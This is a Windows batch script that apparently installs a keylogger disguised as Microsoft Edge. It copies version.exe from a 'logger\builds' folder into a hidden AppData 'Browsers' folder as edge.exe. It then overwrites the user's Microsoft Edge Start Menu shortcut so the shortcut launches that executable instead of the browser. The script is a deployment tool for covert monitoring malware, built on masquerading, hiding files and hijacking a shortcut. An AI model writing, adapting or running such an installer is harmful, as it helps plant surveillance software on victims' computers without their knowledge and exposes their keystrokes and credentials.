@echo off
setlocal
color 3

echo Type .exe file disk letter (e.g. Y):
set /p DISK_LETTER=

set "USER_PROFILE=%USERPROFILE%"

set "EXE_PATH=%DISK_LETTER%:\logger\builds\version.exe"
set "EXE_DEST=%USERPROFILE%\AppData\Roaming\Browsers\edge.exe"
set "SHORTCUT_PATH=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk"

:: Check if the source file exists
if not exist "%EXE_PATH%" (
    echo [ERROR] The exe file does not exist at the specified path: %EXE_PATH%
    pause
    exit
)

:: Create the Browsers folder if it doesn't exist
if not exist "%USER_PROFILE%\AppData\Roaming\Browsers" (
    echo [INFO] Creating Browsers folder...
    mkdir "%USER_PROFILE%\AppData\Roaming\Browsers"
)

:: If the destination file already exists, delete it before copying
if exist "%EXE_DEST%" (
    echo [INFO] The destination file already exists. Replacing...
    del /F /Q "%EXE_DEST%"
)

:: Copy the file
echo [INFO] Copying the file...
copy "%EXE_PATH%" "%EXE_DEST%" /Y >nul
if not exist "%EXE_DEST%" (
    echo [ERROR] Failed to copy the file.
    pause
    exit
)

:: Set the file as hidden
attrib +h "%USER_PROFILE%\AppData\Roaming\Browsers"

:: If the shortcut already exists, delete it before creating a new one
if exist "%SHORTCUT_PATH%" (
    echo [INFO] The shortcut already exists. Replacing...
    del /F /Q "%SHORTCUT_PATH%"
)

:: Create the shortcut
echo [INFO] Creating the shortcut...
powershell -Command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%SHORTCUT_PATH%'); $s.TargetPath='%EXE_DEST%'; $s.Save()"

:: Check if the shortcut was created
if not exist "%SHORTCUT_PATH%" (
    echo [ERROR] Failed to create the shortcut.
    pause
    exit
)

:: Open the folder
echo [INFO] Opening Explorer...
explorer "%USER_PROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
explorer "%USER_PROFILE%\AppData\Roaming\Browsers"

echo [SUCCESS] Copying files completed!
